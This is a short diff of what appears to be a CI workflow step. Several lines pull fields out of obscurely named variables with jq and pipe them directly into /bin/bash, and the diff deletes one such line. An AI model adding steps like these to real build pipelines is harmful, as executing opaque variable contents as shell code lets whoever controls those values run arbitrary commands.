@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$qykhj40" | jq -r .q9438 | /bin/bash
           echo $mic1318 | jq -r .m40 | /bin/bash
           echo $nks98 | jq -r .bqbt188 | /bin/bash
-          printf '%s' "$b06671" | jq -r .ele131 | /bin/bash
           printf '%s' "$sg32697" | jq -r .xt16 | /bin/bash
 
       - name: Save output
